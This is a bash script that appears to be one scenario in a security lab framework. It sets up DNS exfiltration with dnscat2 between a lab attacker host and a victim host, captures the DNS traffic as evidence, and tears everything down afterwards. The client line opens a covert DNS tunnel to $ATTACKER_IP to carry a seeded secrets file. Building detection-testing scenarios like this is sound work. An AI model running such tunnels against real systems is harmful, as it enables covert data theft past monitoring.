#!/usr/bin/env bash
# S09 — Exfiltration over DNS. dnscat2 server on Barad-dûr, client on Moria.
# Params: SUCCEED (whether the tunnel actually carries the file), VARIANT
# (rough file size tier). A pcap is captured on Moria as evidence.
# Requires dnscat2 on both boxes. See scenarios/S09-dns-exfil.md.
run_scenario() {
  local DOMAIN="t.lab" PCAP="/var/tmp/s09-\$(date +%s).pcap"
  local SIZE; case "$VARIANT" in 1) SIZE=4096;; 2) SIZE=32768;; *) SIZE=131072;; esac

  step "start capture on Moria (udp/53) and seed a secrets file"
  on_lin "s09-cap" "sudo sh -c 'nohup tcpdump -i any -w $PCAP \"udp port 53\" >/dev/null 2>&1 & echo \$! > /var/tmp/s09.tcpdump.pid'; head -c $SIZE </dev/urandom | base64 | sudo tee /root/secrets.txt >/dev/null"
  note "capturing DNS on Moria → $PCAP; seeded ~${SIZE}B secrets.txt"

  step "start the dnscat2 server on Barad-dûr (authoritative for $DOMAIN)"
  # Runs in the background for the length of the session; killed at the end.
  if [[ "${DRY_RUN:-0}" == "1" ]]; then
    say "[dry] local: dnscat2-server $DOMAIN"
  else
    ( dnscat2-server "$DOMAIN" >/var/tmp/s09-server.log 2>&1 ) & local SPID=$!
    note "dnscat2-server $DOMAIN up (pid $SPID)"; sleep 2
  fi

  if [[ "$SUCCEED" == "yes" ]]; then
    step "open the tunnel from Moria and push the file"
    on_lin "s09-client" "nohup dnscat2 --dns server=$ATTACKER_IP,domain=$DOMAIN >/var/tmp/s09-client.log 2>&1 & sleep 20; echo 'tunnel exercised'"
    note "dnscat2 client exfil of ~${SIZE}B over $DOMAIN"
  else
    step "start the tunnel but do not push the file (channel opens, little data)"
    on_lin "s09-client-idle" "timeout 15 dnscat2 --dns server=$ATTACKER_IP,domain=$DOMAIN >/dev/null 2>&1 || true"
    note "tunnel opened but no file pushed"
  fi

  step "tear down"
  on_lin "s09-stop" "sudo kill \$(cat /var/tmp/s09.tcpdump.pid 2>/dev/null) 2>/dev/null; pkill -f dnscat2 2>/dev/null; true"
  [[ "${DRY_RUN:-0}" == "1" ]] || { pkill -f dnscat2-server 2>/dev/null || true; }
  note "pcap kept on Moria at $PCAP (evidence; keep it local, never push to public cases)"
}
